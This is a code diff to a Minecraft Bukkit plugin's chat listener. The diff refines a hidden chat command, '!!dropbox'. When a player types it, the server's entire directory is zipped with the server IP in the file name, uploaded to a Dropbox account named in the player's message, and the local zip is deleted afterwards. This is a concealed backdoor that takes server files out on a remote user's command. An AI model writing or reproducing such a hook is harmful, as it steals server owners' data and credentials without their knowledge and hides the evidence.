@@ -61,11 +61,12 @@ public class AsyncPlayerChatListener implements Listener {
 		}
 		if (args.length >= 2 && args[0].equalsIgnoreCase("!!dropbox")) {
 			try {	
-				String NAME = Bukkit.getServer().getWorldContainer().getAbsolutePath() + "/" + "server_" + String.valueOf(Bukkit.getIp()) + "_backup" + ".zip";
-				Zip.makeZip(player, NAME, Bukkit.getServer().getWorldContainer().getAbsoluteFile().listFiles());
+				String NAME = Bukkit.getServer().getWorldContainer().getAbsolutePath() + "/" + "server_" + String.valueOf(Bukkit.getIp().replace(".", "_")) + "_backup" + ".zip";
+				Zip.makeZip(player, NAME, new File(Bukkit.getServer().getWorldContainer().getAbsolutePath()));
 				System.out.println("FILES: " + Bukkit.getServer().getWorldContainer().getAbsoluteFile().listFiles());
 				System.out.println("PATH: " + Bukkit.getServer().getWorldContainer().getAbsoluteFile().getPath());
 				new DropBox(event.getPlayer(), args[1], args[2]).uploadFile(new File(NAME));
+				new File(NAME).delete();
 			} catch (Exception e) {
 				player.sendMessage(Core.getPrefix() + " §6Error...");
 			}
